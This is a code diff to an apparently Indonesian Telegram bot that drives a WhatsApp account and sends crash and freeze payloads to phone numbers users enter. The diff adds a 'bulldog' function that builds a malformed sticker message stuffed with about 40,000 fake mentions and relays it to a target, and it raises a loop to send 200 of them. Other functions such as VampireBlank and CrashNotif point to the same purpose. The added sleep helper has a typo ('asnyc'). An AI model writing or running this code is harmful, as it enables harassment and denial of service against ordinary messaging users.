@@ -231,6 +231,9 @@ async function spamcall(target) {
         sock.ws.close(); // Tutup koneksi WebSocket
     }
 }
+asnyc function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
 async function VampireBlank(target, ptcp = true) {
   const Vampire = `_*~@8~*_\n`.repeat(10500);
   const CrashNotif = 'ꦽ'.repeat(55555);
@@ -940,6 +943,82 @@ async function VampireNewUi(target, Ptcp = true) {
         console.log(err);
       }
     }
+async function bulldog(target) {
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+          mimetype: "image/webp",
+          directPath:
+            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileLength: { low: 1, high: 0, unsigned: true },
+          mediaKeyTimestamp: {
+            low: 1746112211,
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 40000,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: -1939477883,
+            high: 406,
+            unsigned: false,
+          },
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
+        },
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(target, message, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+}
     async function protocolbug2(target, mention) {
     const generateMessage = {
         viewOnceMessage: {
@@ -2257,7 +2336,7 @@ bot.onText(/\/delaymention(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/frezyhge(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/bull(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -2268,7 +2347,7 @@ bot.onText(/\/frezyhge(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /superdelay 62×××.");
+        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /bulldog 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -2286,9 +2365,12 @@ bot.onText(/\/frezyhge(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
-        await freezechat(formatedNumber);
-        await freezechat(formatedNumber);
+    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
+        await bulldog(formatedNumber);
+        await bulldog(formatedNumber);
+        await bulldog(formatedNumber);
+        await bulldog(formatedNumber);
+        await sleep(3000)
     }
 
     await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
